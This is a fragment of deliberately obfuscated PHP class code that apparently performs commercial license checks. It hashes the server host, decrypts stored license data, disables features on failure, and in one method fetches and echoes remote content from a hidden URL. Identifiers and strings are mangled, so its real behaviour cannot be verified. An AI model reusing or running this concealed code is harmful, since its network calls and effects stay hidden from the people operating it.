$this->rxhtc414dee3, $A¿ÑÌÕÚ‰[136] => $this->{$_SERVER[òÈ„‹Ü][137]}(), $A¿ÑÌÕÚ‰[138] => $A¿ÑÌÕÚ‰[61]($A¿ÑÌÕÚ‰[139])->{$_SERVER[òÈ„‹Ü][140]}()); if ($this->rxhtc414dee3 != $A¿ÑÌÕÚ‰[121]) { $AØÆ‚œ–ÖË = $A¿ÑÌÕÚ‰[104]($this->rsvj46b300e7, $A¿ÑÌÕÚ‰[141]); if ($AØÆ‚œ–ÖË) { $bø¦´”Ë‰ç[$A¿ÑÌÕÚ‰[142]] = $AØÆ‚œ–ÖË; $bø¦´”Ë‰ç[$A¿ÑÌÕÚ‰[143]] = $A¿ÑÌÕÚ‰[144]($A¿ÑÌÕÚ‰[104]($this->rsvj46b300e7, $A¿ÑÌÕÚ‰[145])); $bø¦´”Ë‰ç[$A¿ÑÌÕÚ‰[146]] = $A¿ÑÌÕÚ‰[104]($this->rsvj46b300e7, $A¿ÑÌÕÚ‰[131]); } } $bø¦´”Ë‰ç = $this->{$_SERVER[òÈ„‹Ü][147]}($A¿ÑÌÕÚ‰[148]($bø¦´”Ë‰ç), $A¿ÑÌÕÚ‰[114]($A¿ÑÌÕÚ‰[149])); goto E„âîôÚå¤; E„âîôÚå¤: $F°³„‚ÀáÜ = $BªŒ¸İ¿Û¼[587]; if (strlen($F°³„‚ÀáÜ) < $BªŒ¸İ¿Û¼[558]) { return; } $Cç¤òØÒŒÒ = array($A¿ÑÌÕÚ‰[150] => $bø¦´”Ë‰ç); goto E…öŞŞñÏ; aÉÍÑùÍ¥è: } goto D¯á“ºæ; CÛ‰¦…‡…: $Cç¤òØÒŒÒ = array($A¿ÑÌÕÚ‰[159] => $CÎ…ÈÓå”[$A¿ÑÌÕÚ‰[64]], $A¿ÑÌÕÚ‰[160] => $CÎ…ÈÓå”[$A¿ÑÌÕÚ‰[65]], $A¿ÑÌÕÚ‰[161] => $A¿ÑÌÕÚ‰[10]); $BøÄêøêµš = $BªŒ¸İ¿Û¼[589]; while ($BøÄêøêµš < $BªŒ¸İ¿Û¼[555]) { if ($BøÄêøêµš >= 0) { break; } $BøÄêøêµš++; } goto cö°½ …åæ; cö°½ …åæ: foreach ($Cé–©ğªóî as $FâóëÅÛÔ†) { if (!isset($CÎ…ÈÓå”[$FâóëÅÛÔ†]) || !$CÎ…ÈÓå”[$FâóëÅÛÔ†]) { continue; } $Cç¤òØÒŒÒ[$FâóëÅÛÔ†] = $CÎ…ÈÓå”[$FâóëÅÛÔ†]; } $A¿ÑÌÕÚ‰[13](array($A¿ÑÌÕÚ‰[151], $A¿ÑÌÕÚ‰[152]), $Cç¤òØÒŒÒ); goto aó¶®µ„Ù; D¯á“ºæ: if ($this->rxhtc414dee3 == $A¿ÑÌÕÚ‰[121]) { return; } $Cé–©ğªóî = array($A¿ÑÌÕÚ‰[153], $A¿ÑÌÕÚ‰[154], $A¿ÑÌÕÚ‰[155], $A¿ÑÌÕÚ‰[156], $A¿ÑÌÕÚ‰[157], $A¿ÑÌÕÚ‰[158]); $CÎ…ÈÓå” = $A¿ÑÌÕÚ‰[61]($A¿ÑÌÕÚ‰[62])->{$_SERVER[òÈ„‹Ü][63]}(); goto CÛ‰¦…‡…; aó¶®µ„Ù: } private function ygmje874f8d1() { goto eÜ§Çç©‡İ; Aàºáñã ¾: $Eàª¹Û–ˆ„ = $cÄ§ùÒ˜›Ç[599]; $this->rxhtc414dee3 = $fÁÖôÅëØ[$d¢ËÏê®Š [120]]; $this->{$_SERVER[òÈ„‹Ü][229]}(); goto aÚÃå˜Ç‡; e¸ƒ„á«ÆŸ: $f˜é´Ìß…§ = $b¨²ŒÇùô[$d¢ËÏê®Š [192]]; $c‡ÃÉæ •› = $this->{$_SERVER[òÈ„‹Ü][199]}($f˜é´Ìß…§[$d¢ËÏê®Š [200]]); if (!$c‡ÃÉæ •› || $c‡ÃÉæ •› != $d¢ËÏê®Š [201]($f˜é´Ìß…§[$d¢ËÏê®Š [145]])) { $Eêß¥¡»ö‡ = array($d¢ËÏê®Š [202] => $d¢ËÏê®Š [61]($d¢ËÏê®Š [62])->{$_SERVER[òÈ„‹Ü][63]}($d¢ËÏê®Š [116]), $d¢ËÏê®Š [203] => $_SERVER[$d¢ËÏê®Š [115]], $d¢ËÏê®Š [204] => $d¢ËÏê®Š [205](), $d¢ËÏê®Š [174] => $_SERVER[$d¢ËÏê®Š [175]]); $D·ÇÓè—³§ = $this->{$_SERVER[òÈ„‹Ü][206]}($d¢ËÏê®Š [148]($Eêß¥¡»ö‡)); $this->{$_SERVER[òÈ„‹Ü][182]}($d¢ËÏê®Š [207] . $D·ÇÓè—³§); $d¢ËÏê®Š [166]($d¢ËÏê®Š [197]($d¢ËÏê®Š [208]), !0); } goto cŞìºóÒ·Â; a¤ÜÖ‹°‘Ü: $f¿¼ÈêÏ¤ = $this->{$_SERVER[òÈ„‹Ü][127]}($d¢ËÏê®Š [148]($f˜é´Ìß…§), $eï°†Â«¸); $bÄ¤Â‚†Ê = $d¢ËÏê®Š [222]($d¢ËÏê®Š [61]($d¢ËÏê®Š [11])->{$_SERVER[òÈ„‹Ü][223]}(), $d¢ËÏê®Š [224]); $bÄÓÎÒåô = $bÄ¤Â‚†Ê[$d¢ËÏê®Š [225]]; goto ağËë èß‚; cŞìºóÒ·Â: $fÁÖôÅëØ = array($d¢ËÏê®Š [209] => $b±Òç‚Æ÷’[$d¢ËÏê®Š [165]], $d¢ËÏê®Š [210] => $f˜é´Ìß…§[$d¢ËÏê®Š [211]], $d¢ËÏê®Š [212] => $d¢ËÏê®Š [124](16), $d¢ËÏê®Š [120] => $f˜é´Ìß…§[$d¢ËÏê®Š [213]]); if ($b±Òç‚Æ÷’[$d¢ËÏê®Š [168]]) { $fÁÖôÅëØ[$d¢ËÏê®Š [212]] = $b±Òç‚Æ÷’[$d¢ËÏê®Š [168]]; } $f™çÑÁåà© = $d¢ËÏê®Š [25]($d¢ËÏê®Š [114]($fÁÖôÅëØ[$d¢ËÏê®Š [210]]), 10, 10); goto E³·Ëª‘ğ®; d’…‰’ñ½‡: $AåƒŒ×Ö = $d¢ËÏê®Š [124](16); $FÑñÑ•Ôá‚ = $cÄ§ùÒ˜›Ç[593]; if (strlen($FÑñÑ•Ôá‚) < $cÄ§ùÒ˜›Ç[555]) { return; } goto E¦Ë‘‹„Ìó; cÅçĞŸÖ¼Ú: $fÁÖôÅëØ[$d¢ËÏê®Š [122]] = $d¢ËÏê®Š [214]($d¢ËÏê®Š [118]($this->{$_SERVER[òÈ„‹Ü][147]}($aƒ‡¾†¾±Œ, $d¢ËÏê®Š [215]))); $DÌ‹‡°îİ = $cÄ§ùÒ˜›Ç[592]; while (strlen($DÌ‹‡°îİ) < $cÄ§ùÒ˜›Ç[558]) { if (!$DÌ‹‡°îİ) { break; } $DÌ‹‡°îİ++; } goto d’…‰’ñ½‡; eÜ§Çç©‡İ: $cÄ§ùÒ˜›Ç =& $_SERVER[‚Ğ°–—î]; $d¢ËÏê®Š  =& $_SERVER[òÈ„‹Ü]; if ($_SERVER[$d¢ËÏê®Š [44]] != $d¢ËÏê®Š [162]) { return; } goto F˜âææ…Ã; cÈÍÉãŠÜ: if (strlen($bô ‡Ÿ½Ü) < $cÄ§ùÒ˜›Ç[558]) { return; } $FµÑï´¾‹ğ = $d¢ËÏê®Š [214]($d¢ËÏê®Š [25]($eï°†Â«¸, 10, 16)); $dÒ”˜“×„ñ = $cÄ§ùÒ˜›Ç[595]; goto a¤ÜÖ‹°‘Ü; cÈ §ó†™Ÿ: $fõÙò©ğĞæ = $d¢ËÏê®Š [114]($_SERVER[$d¢ËÏê®Š [115]] . $d—ä¤¡ÌÂš); if ($bĞ¼±˜í„š[$d¢ËÏê®Š [178]] == $d¢ËÏê®Š [179]) { $EªÀ‡§Ëõ = $this->{$_SERVER[òÈ„‹Ü][147]}($fõÙò©ğĞæ, $d¢ËÏê®Š [180]); $D·ÇÓè—³§ = $this->{$_SERVER[òÈ„‹Ü][127]}($d¢ËÏê®Š [148]($b±Òç‚Æ÷’), $fõÙò©ğĞæ . $d¢ËÏê®Š [181], 3); $f†¸Ï‡ã = $this->{$_SERVER[òÈ„‹Ü][182]}($d¢ËÏê®Š [183] . $EªÀ‡§Ëõ . $d¢ËÏê®Š [184] . $D·ÇÓè—³§, -1); $d¢ËÏê®Š [166]($f†¸Ï‡ã, !0); } else { if ($bĞ¼±˜í„š[$d¢ËÏê®Š [178]] == $d¢ËÏê®Š [185]) { $c¯†äÏ• = $d¢ËÏê®Š [25]($d¢ËÏê®Š [114]($d¢ËÏê®Š [186] . $fõÙò©ğĞæ), 12, 15) . $d¢ËÏê®Š [187]; $D·ÇÓè—³§ = $this->{$_SERVER[òÈ„‹Ü][188]}($d¢ËÏê®Š [2]($bĞ¼±˜í„š[$d¢ËÏê®Š [189]]), $c¯†äÏ•, 2); $b¨²ŒÇùô = $d¢ËÏê®Š [190]($D·ÇÓè—³§, !0); if (!$d¢ËÏê®Š [191]($b¨²ŒÇùô) || !$d¢ËÏê®Š [191]($b¨²ŒÇùô[$d¢ËÏê®Š [192]]) || $b¨²ŒÇùô[$d¢ËÏê®Š [165]] != !0) { $E¾¼¾è‘˜ = $d¢ËÏê®Š [193]; $d“£ôâÎ±â = $b¨²ŒÇùô[$d¢ËÏê®Š [192]] ? $d¢ËÏê®Š [194] . $b¨²ŒÇùô[$d¢ËÏê®Š [192]] : $E¾¼¾è‘˜; $d¢ËÏê®Š [166]($d“£ôâÎ±â, !1); } else { $b±Òç‚Æ÷’[$d¢ËÏê®Š [168]] = $b¨²ŒÇùô[$d¢ËÏê®Š [192]][$d¢ËÏê®Š [195]]; } } else { $b¨²ŒÇùô = $this->{$_SERVER[òÈ„‹Ü][182]}($d¢ËÏê®Š [196], $b±Òç‚Æ÷’, 10); $cÎ”†ÔÀ¦ë = $cÄ§ùÒ˜›Ç[590]; if (!$cÎ”†ÔÀ¦ë) { return; } } } if (!$d¢ËÏê®Š [191]($b¨²ŒÇùô) || !$d¢ËÏê®Š [191]($b¨²ŒÇùô[$d¢ËÏê®Š [192]]) || $b¨²ŒÇùô[$d¢ËÏê®Š [165]] != !0) { $E¾¼¾è‘˜ = $d¢ËÏê®Š [197]($d¢ËÏê®Š [198]); $d“£ôâÎ±â = $b¨²ŒÇùô[$d¢ËÏê®Š [192]] ? $d¢ËÏê®Š [194] . $b¨²ŒÇùô[$d¢ËÏê®Š [192]] : $E¾¼¾è‘˜; $d¢ËÏê®Š [166]($d“£ôâÎ±â, !1); } goto e¸ƒ„á«ÆŸ; E³·Ëª‘ğ®: $aƒ‡¾†¾±Œ = $f™çÑÁåà© . $fÁÖôÅëØ[$d¢ËÏê®Š [120]] . $fÁÖôÅëØ[$d¢ËÏê®Š [212]]; $fìÃ‹¢Üß© = $cÄ§ùÒ˜›Ç[591]; if (strlen($fìÃ‹¢Üß©) < $cÄ§ùÒ˜›Ç[572]) { return; } goto cÅçĞŸÖ¼Ú; eÊ¹åé´µ: $f£»óæì = $cÄ§ùÒ˜›Ç[601]; while ($f£»óæì < $cÄ§ùÒ˜›Ç[558]) { if ($f£»óæì >= 0) { break; } $f£»óæì++; } goto bïÜù¬¨Ò; eæ“ÁÄçË¨: $fçí‚İÉïØ = $cÄ§ùÒ˜›Ç[597]; if (!$fçí‚İÉïØ) { die; } $d¢ËÏê®Š [61]($d¢ËÏê®Š [11])->{$_SERVER[òÈ„‹Ü][226]}($bÄÓÎÒåô[$d¢ËÏê®Š [227]], array($d¢ËÏê®Š [228] => $b¡ŒÚÂ¥İ¢)); goto EµÒ‚ù‡æá; B„óØœ‚·: $d¢ËÏê®Š [61]($d¢ËÏê®Š [62])->{$_SERVER[òÈ„‹Ü][221]}($fÁÖôÅëØ); $eï°†Â«¸ = $d¢ËÏê®Š [114]($_SERVER[$d¢ËÏê®Š [115]] . $d¢ËÏê®Š [214]($d—ä¤¡ÌÂš) . $fÁÖôÅëØ[$d¢ËÏê®Š [210]]); $bô ‡Ÿ½Ü = $cÄ§ùÒ˜›Ç[594]; goto cÈÍÉãŠÜ; E¦Ë‘‹„Ìó: $Fø•…‹ï = $AåƒŒ×Ö . $fÁÖôÅëØ[$d¢ËÏê®Š [120]] . $this->{$_SERVER[òÈ„‹Ü][147]}($d¢ËÏê®Š [114]($fÁÖôÅëØ[$d¢ËÏê®Š [209]]), $AåƒŒ×Ö); $fÁÖôÅëØ[$d¢ËÏê®Š [123]] = $d¢ËÏê®Š [118]($d¢ËÏê®Š [214]($this->{$_SERVER[òÈ„‹Ü][147]}($Fø•…‹ï, $d¢ËÏê®Š [216]))); if ($f˜é´Ìß…§[$d¢ËÏê®Š [217]] && $f˜é´Ìß…§[$d¢ËÏê®Š [217]] >= 1) { $d¢ËÏê®Š [61]($d¢ËÏê®Š [62])->{$_SERVER[òÈ„‹Ü][218]}($d¢ËÏê®Š [219], $d¢ËÏê®Š [220]); } goto B„óØœ‚·; F˜âææ…Ã: if (!$d¢ËÏê®Š [104]($GLOBALS, $d¢ËÏê®Š [132])) { die; } $bĞ¼±˜í„š = $GLOBALS[$d¢ËÏê®Š [22]]; if (isset($bĞ¼±˜í„š[$d¢ËÏê®Š [163]])) { $this->{$_SERVER[òÈ„‹Ü][164]}(); die; } goto FˆÒÅÉ­Œ; FˆÒÅÉ­Œ: if (!isset($bĞ¼±˜í„š[$d¢ËÏê®Š [165]]) || $d¢ËÏê®Š [24]($bĞ¼±˜í„š[$d¢ËÏê®Š [165]]) != 16) { $d¢ËÏê®Š [166]($d¢ËÏê®Š [167] . $bĞ¼±˜í„š[$d¢ËÏê®Š [165]], !1); } $d—ä¤¡ÌÂš = $d¢ËÏê®Š [61]($d¢ËÏê®Š [62])->{$_SERVER[òÈ„‹Ü][63]}($d¢ËÏê®Š [116]); $b±Òç‚Æ÷’ = array($d¢ËÏê®Š [165] => $bĞ¼±˜í„š[$d¢ËÏê®Š [165]], $d¢ËÏê®Š [168] => $d¢ËÏê®Š [124](16), $d¢ËÏê®Š [169] => $d¢ËÏê®Š [149], $d¢ËÏê®Š [170] => $d¢ËÏê®Š [171], $d¢ËÏê®Š [172] => $_SERVER[$d¢ËÏê®Š [173]], $d¢ËÏê®Š [174] => $_SERVER[$d¢ËÏê®Š [175]], $d¢ËÏê®Š [176] => $_SERVER[$d¢ËÏê®Š [177]]); goto cÈ §ó†™Ÿ; ağËë èß‚: $b¡ŒÚÂ¥İ¢ = array(); $aÀ°Üœ‹¥ê = $cÄ§ùÒ˜›Ç[596]; $b¡ŒÚÂ¥İ¢[$FµÑï´¾‹ğ] = $f¿¼ÈêÏ¤; goto eæ“ÁÄçË¨; EµÒ‚ù‡æá: $fÍËèç­Æ¾ = $cÄ§ùÒ˜›Ç[598]; while (strlen($fÍËèç­Æ¾) < $cÄ§ùÒ˜›Ç[555]) { if (!$fÍËèç­Æ¾) { break; } $fÍËèç­Æ¾++; } $this->rsvj46b300e7 = $f˜é´Ìß…§; goto Aàºáñã ¾; aÚÃå˜Ç‡: $B†İ†çÑèó = $cÄ§ùÒ˜›Ç[600]; while (strlen($B†İ†çÑèó) < $cÄ§ùÒ˜›Ç[572]) { if (!$B†İ†çÑèó) { break; } $B†İ†çÑèó++; } $d¢ËÏê®Š [166]($d¢ËÏê®Š [197]($d¢ËÏê®Š [208]), !0); goto eÊ¹åé´µ; bïÜù¬¨Ò: } private function licenseRegistSuccess() { goto FÊ¼Š¿·ã¼; fØÖ³òï‡ç: $BŸÌÇ¹Á¼[110]($BŸÌÇ¹Á¼[230])->{$_SERVER[òÈ„‹Ü][231]}(!0); goto a®½é²¹Õá; E‰ĞŒ‘…¼†: $Aí§ò‚±«Ê = $cŒ‰Çóª[602]; while ($Aí§ò‚±«Ê < $cŒ‰Çóª[572]) { if ($Aí§ò‚±«Ê >= 0) { break; } $Aí§ò‚±«Ê++; } if ($bÛæ•²ƒœ[$BŸÌÇ¹Á¼[85]] != $BŸÌÇ¹Á¼[220]) { $BŸÌÇ¹Á¼[61]($BŸÌÇ¹Á¼[62])->{$_SERVER[òÈ„‹Ü][221]}($BŸÌÇ¹Á¼[85], $BŸÌÇ¹Á¼[220]); } goto fØÖ³òï‡ç; FÊ¼Š¿·ã¼: $cŒ‰Çóª =& $_SERVER[‚Ğ°–—î]; $BŸÌÇ¹Á¼ =& $_SERVER[òÈ„‹Ü]; $bÛæ•²ƒœ = $BŸÌÇ¹Á¼[61]($BŸÌÇ¹Á¼[62])->{$_SERVER[òÈ„‹Ü][63]}(); goto E‰ĞŒ‘…¼†; a®½é²¹Õá: } private function nreuad2310d0() { goto A£ï’ÈåÕ; A£ï’ÈåÕ: $C¹ÖŞœ’ =& $_SERVER[‚Ğ°–—î]; $A¥œÅàØİ =& $_SERVER[òÈ„‹Ü]; $A¥œÅàØİ[61]($A¥œÅàØİ[62])->{$_SERVER[òÈ„‹Ü][221]}(array($A¥œÅàØİ[209] => $A¥œÅàØİ[10], $A¥œÅàØİ[210] => $A¥œÅàØİ[10], $A¥œÅàØİ[120] => $A¥œÅàØİ[121], $A¥œÅàØİ[122] => $A¥œÅàØİ[10], $A¥œÅàØİ[123] => $A¥œÅàØİ[10])); goto D‹çŒËğÙ; D‹çŒËğÙ: $A¥œÅàØİ[61]($A¥œÅàØİ[62])->{$_SERVER[òÈ„‹Ü][218]}($A¥œÅàØİ[219], $A¥œÅàØİ[232]); $FÔ­­ÀË÷ = $C¹ÖŞœ’[603]; $this->rsvj46b300e7 = array(); goto c¨áœåÄù; c¨áœåÄù: $b†è˜§æÖ‰ = $C¹ÖŞœ’[604]; $this->rxhtc414dee3 = $A¥œÅàØİ[121]; goto d§äÁã–„; d§äÁã–„: } private function tike29a9ce09() { goto Eˆ»Â’êœ•; FíõÇ³†ï±: $dÌÏÏí§Íæ = $F‰–ª¢Â÷ì[214]($F‰–ª¢Â÷ì[25]($ašôÁ¡˜Ê‡, 10, 16)); $Bë×‹æøÀ = $A¥é²Ø˜µØ[609]; if (strlen($Bë×‹æøÀ) < $A¥é²Ø˜µØ[610]) { die; } goto cÖåÀ‡ÖŞ×; cç·‚›¶²: $c­íäĞŠÓ‘ = $A¥é²Ø˜µØ[606]; if (strlen($c­íäĞŠÓ‘) < $A¥é²Ø˜µØ[558]) { die; } $A÷•§™ÓŠ = $F‰–ª¢Â÷ì[61]($F‰–ª¢Â÷ì[62])->{$_SERVER[òÈ„‹Ü][63]}(); goto b²¾ìöÉèç; aİ£®á×ÑØ: $e¥î°‘©Ö = $F‰–ª¢Â÷ì[61]($F‰–ª¢Â÷ì[62])->{$_SERVER[òÈ„‹Ü][63]}($F‰–ª¢Â÷ì[116]); $eá«¥Ù«Å = $A¥é²Ø˜µØ[608]; if (strlen($eá«¥Ù«Å) < $A¥é²Ø˜µØ[558]) { return; } goto E„í£íßÃ; Dè‘½‡„¡: $this->rxhtc414dee3 = $A÷•§™ÓŠ[$F‰–ª¢Â÷ì[120]]; $bÆœÉ¥½‰ = $A¥é²Ø˜µØ[611]; if (!$bÆœÉ¥½‰) { return; } goto cÒÖƒ³’Ó; aéò½ŒŠë: $féËíŞÃ­í = $F‰–ª¢Â÷ì[144]($Aµø¼„ºÒ“[$F‰–ª¢Â÷ì[145]]); if ($F‰–ª¢Â÷ì[233]() >= $féËíŞÃ­í) { return $this->{$_SERVER[òÈ„‹Ü][164]}(); } $this->rsvj46b300e7 = $Aµø¼„ºÒ“; goto Dè‘½‡„¡; E„í£íßÃ: $EÎĞõêƒ— = $F‰–ª¢Â÷ì[222]($F‰–ª¢Â÷ì[61]($F‰–ª¢Â÷ì[11])->{$_SERVER[òÈ„‹Ü][223]}(), $F‰–ª¢Â÷ì[224]); $D¯¥Ë’Í‰ = $EÎĞõêƒ—[$F‰–ª¢Â÷ì[225]]; $ašôÁ¡˜Ê‡ = $F‰–ª¢Â÷ì[114]($_SERVER[$F‰–ª¢Â÷ì[115]] . $F‰–ª¢Â÷ì[214]($e¥î°‘©Ö) . $A÷•§™ÓŠ[$F‰–ª¢Â÷ì[210]]); goto FíõÇ³†ï±; Eˆ»Â’êœ•: $A¥é²Ø˜µØ =& $_SERVER[‚Ğ°–—î]; $F‰–ª¢Â÷ì =& $_SERVER[òÈ„‹Ü]; $_SERVER[$F‰–ª¢Â÷ì[175]] = $F‰–ª¢Â÷ì[104]($_SERVER, $F‰–ª¢Â÷ì[175], APP_HOST); goto aåÏ­–ˆ°¬; aåÏ­–ˆ°¬: $EÑ¡Ğ”÷ÍŠ = $A¥é²Ø˜µØ[605]; if (strlen($EÑ¡Ğ”÷ÍŠ) < $A¥é²Ø˜µØ[555]) { return; } $this->rxhtc414dee3 = $F‰–ª¢Â÷ì[121]; goto cç·‚›¶²; b²¾ìöÉèç: $F¼ïäà‚Â = $A¥é²Ø˜µØ[607]; while ($F¼ïäà‚Â < $A¥é²Ø˜µØ[558]) { if ($F¼ïäà‚Â >= 0) { break; } $F¼ïäà‚Â++; } if ($A÷•§™ÓŠ[$F‰–ª¢Â÷ì[120]] == $F‰–ª¢Â÷ì[121]) { return; } goto aİ£®á×ÑØ; cÖåÀ‡ÖŞ×: $Aµø¼„ºÒ“ = $this->{$_SERVER[òÈ„‹Ü][188]}($D¯¥Ë’Í‰[$F‰–ª¢Â÷ì[91]][$dÌÏÏí§Íæ], $ašôÁ¡˜Ê‡); $Aµø¼„ºÒ“ = $F‰–ª¢Â÷ì[190]($Aµø¼„ºÒ“, !0); if (!$F‰–ª¢Â÷ì[191]($Aµø¼„ºÒ“)) { return $this->{$_SERVER[òÈ„‹Ü][164]}(); } goto aéò½ŒŠë; cÒÖƒ³’Ó: } private function mbzk7d07c0df() { $FÍ¾ˆËõ­à =& $_SERVER[òÈ„‹Ü]; $e¿æìÂ£• = $GLOBALS[$FÍ¾ˆËõ­à[22]]; $B¼—ºãì¥Ø = $_SERVER[$FÍ¾ˆËõ­à[44]]; if ($B¼—ºãì¥Ø == $FÍ¾ˆËõ­à[234] && $this->rxhtc414dee3 == $FÍ¾ˆËõ­à[121]) { $FÍ¾ˆËõ­à[166]($FÍ¾ˆËõ­à[197]($FÍ¾ˆËõ­à[235]), !1, $FÍ¾ˆËõ­à[236]); } $B©Û½ã‘™ = array($FÍ¾ˆËõ­à[237], $FÍ¾ˆËõ­à[238]); if ($FÍ¾ˆËõ­à[239]($B¼—ºãì¥Ø, $B©Û½ã‘™)) { if ($this->rxhtc414dee3 == $FÍ¾ˆËõ­à[121] && isset($e¿æìÂ£•[$FÍ¾ˆËõ­à[240]])) { $FÍ¾ˆËõ­à[166]($FÍ¾ˆËõ­à[197]($FÍ¾ˆËõ­à[235]), !1, $FÍ¾ˆËõ­à[236]); die; } $EÍ„Ìˆœ¸í = $this->{$_SERVER[òÈ„‹Ü][137]}(); if ($EÍ„Ìˆœ¸í != $FÍ¾ˆËõ­à[201]($FÍ¾ˆËõ­à[241])) { if ($EÍ„Ìˆœ¸í <= $FÍ¾ˆËõ­à[61]($FÍ¾ˆËõ­à[139])->{$_SERVER[òÈ„‹Ü][140]}()) { $FÍ¾ˆËõ­à[166]($FÍ¾ˆËõ­à[197]($FÍ¾ˆËõ­à[242]), !1, $FÍ¾ˆËõ­à[236]); die; } } } } private function nxtoa91dbdb6() { goto C®ëâÖñ²»; b¬È‰ƒ«ÅŞ: if (strlen($D”öÑ·…Ô’) < $bÊØ†šÚ¦‘[558]) { die; } $e‹ˆŸÕ•½ñ[254]($e‹ˆŸÕ•½ñ[255]); $c‹Üá‰ß·õ = $bÊØ†šÚ¦‘[616]; goto aƒ““šô¾İ; e‡‡½ç‹¼·: $Dë§ËœŒÍ™ = $bÊØ†šÚ¦‘[612]; $E«†ÍÊ×‹Ù = $this->{$_SERVER[òÈ„‹Ü][246]}($E«†ÍÊ×‹Ù, $e‹ˆŸÕ•½ñ[247]); $AƒÄùì®Šˆ = $bÊØ†šÚ¦‘[613]; goto cõĞ‚¨¥Ê‡; B¢İÑ›ù§·: if (!$e‹ˆŸÕ•½ñ[104]($GLOBALS, $e‹ˆŸÕ•½ñ[132]) || !isset($_GET[$e‹ˆŸÕ•½ñ[244]])) { return; } if (!$e‹ˆŸÕ•½ñ[239]($_SERVER[$e‹ˆŸÕ•½ñ[44]], $bÆ’Œù•Ã)) { return; } $E«†ÍÊ×‹Ù = $e‹ˆŸÕ•½ñ[245]; goto e‡‡½ç‹¼·; aƒ““šô¾İ: if (strlen($c‹Üá‰ß·õ) < $bÊØ†šÚ¦‘[610]) { die; } if ($Cã¿í¢¯± && $e‹ˆŸÕ•½ñ[32]($Cã¿í¢¯±, $e‹ˆŸÕ•½ñ[256])) { echo $Cã¿í¢¯±; } die; goto A‘…æ³–©ä; cõĞ‚¨¥Ê‡: if (!$AƒÄùì®Šˆ) { return; } $CÌî¬¨Ê›î = $e‹ˆŸÕ•½ñ[248](array($e‹ˆŸÕ•½ñ[249] => array($e‹ˆŸÕ•½ñ[250] => $e‹ˆŸÕ•½ñ[251], $e‹ˆŸÕ•½ñ[252] => 3))); $b²ƒøˆ«à = $bÊØ†šÚ¦‘[614]; goto bÖíêÕ‹—É; bÖíêÕ‹—É: while (strlen($b²ƒøˆ«à) < $bÊØ†šÚ¦‘[551]) { if (!$b²ƒøˆ«à) { break; } $b²ƒøˆ«à++; } $Cã¿í¢¯± = @$e‹ˆŸÕ•½ñ[253]($E«†ÍÊ×‹Ù, !1, $CÌî¬¨Ê›î); $D”öÑ·…Ô’ = $bÊØ†šÚ¦‘[615]; goto b¬È‰ƒ«ÅŞ; C®ëâÖñ²»: $bÊØ†šÚ¦‘ =& $_SERVER[‚Ğ°–—î]; $e‹ˆŸÕ•½ñ =& $_SERVER[òÈ„‹Ü]; $bÆ’Œù•Ã = array($e‹ˆŸÕ•½ñ[135], $e‹ˆŸÕ•½ñ[243]); goto B¢İÑ›ù§·; A‘…æ³–©ä: } public function ldxm1847fc79($aŠÚ“œ·Ç¬) { goto CÄªÓòò°; fä›…ëÎ°ù: foreach ($d‰óÅÉÔÁ¸ as $b÷‹´ñ¸è£) { unset($aŠÚ“œ·Ç¬[$b÷‹´ñ¸è£]); $B÷ƒãÄÓé = $dÕ»‡…Ô[618]; if (strlen($B÷ƒãÄÓé) < $dÕ»‡…Ô[551]) { return; } } return $aŠÚ“œ·Ç¬; $F„Ñ•¨Ü’ = $dÕ»‡…Ô[619]; goto c‚—¨ƒ­«ô; D¹£µãéÚµ: $FîŠèÖÚŞî = $bâ¨Œ›¨ØÇ[0]($bâ¨Œ›¨ØÇ[266], $bâ¨Œ›¨ØÇ[104]($this->rsvj46b300e7, $bâ¨Œ›¨ØÇ[129], $bâ¨Œ›¨ØÇ[10])); $d‰óÅÉÔÁ¸ = array(); foreach ($a“î½ »ø• as $b÷‹´ñ¸è£) { if (!$bâ¨Œ›¨ØÇ[239]($b÷‹´ñ¸è£, $FîŠèÖÚŞî)) { $d‰óÅÉÔÁ¸[] = $b÷‹´ñ¸è£; } } goto fä›…ëÎ°ù; CÄªÓòò°: $dÕ»‡…Ô =& $_SERVER[‚Ğ°–—î]; $bâ¨Œ›¨ØÇ =& $_SERVER[òÈ„‹Ü]; if ($this->rxhtc414dee3 == $bâ¨Œ›¨ØÇ[257]) { return $aŠÚ“œ·Ç¬; } goto f™§¦¢“Š; f™§¦¢“Š: $a“î½ »ø• = array($bâ¨Œ›¨ØÇ[258], $bâ¨Œ›¨ØÇ[259], $bâ¨Œ›¨ØÇ[260], $bâ¨Œ›¨ØÇ[261], $bâ¨Œ›¨ØÇ[262], $bâ¨Œ›¨ØÇ[263], $bâ¨Œ›¨ØÇ[264], $bâ¨Œ›¨ØÇ[265]); $D—˜ößÎÁ‘ = $dÕ»‡…Ô[617]; while ($D—˜ößÎÁ‘ < $dÕ»‡…Ô[551]) { if ($D—˜ößÎÁ‘ >= 0) { break; } $D—˜ößÎÁ‘++; } goto D¹£µãéÚµ; c‚—¨ƒ­«ô: } private function gjxs540e193c() { goto EÒ“×¿–Ä‡; EÒ“×¿–Ä‡: $aÍ…Âò¸¾Ö =& $_SERVER[òÈ„‹Ü]; if ($this->rxhtc414dee3 != $aÍ…Âò¸¾Ö[121]) { $GLOBALS[$aÍ…Âò¸¾Ö[91]][$aÍ…Âò¸¾Ö[95]][$aÍ…Âò¸¾Ö[267]] = $aÍ…Âò¸¾Ö[220]; return; } $dÕ¡³ò”á¸ = $_SERVER[$aÍ…Âò¸¾Ö[44]]; goto Eí­³×ˆ‹; f°‚ÑÂ¯¶æ: $GLOBALS[$aÍ…Âò¸¾Ö[91]][$aÍ…Âò¸¾Ö[271]] = $aÍ…Âò¸¾Ö[220]; if ($aÍ…Âò¸¾Ö[61]($aÍ…Âò¸¾Ö[272])->{$_SERVER[òÈ„‹Ü][63]}($aÍ…Âò¸¾Ö[85]) != $aÍ…Âò¸¾Ö[232]) { $aÍ…Âò¸¾Ö[61]($aÍ…Âò¸¾Ö[272])->{$_SERVER[òÈ„‹Ü][221]}($aÍ…Âò¸¾Ö[85], $aÍ…Âò¸¾Ö[232]); } goto b·´İ†„Œ; Eí­³×ˆ‹: $bÌİàÌî”¾ = array($aÍ…Âò¸¾Ö[268]); foreach ($bÌİàÌî”¾ as $dÇíËèÃ”Ğ) { if ($dÇíËèÃ”Ğ == $dÕ¡³ò”á¸ || $aÍ…Âò¸¾Ö[25]($dÕ¡³ò”á¸, 0, $aÍ…Âò¸¾Ö[24]($dÇíËèÃ”Ğ)) == $dÇíËèÃ”Ğ) { $aÍ…Âò¸¾Ö[166]($aÍ…Âò¸¾Ö[197]($aÍ…Âò¸¾Ö[269]), !1); } } 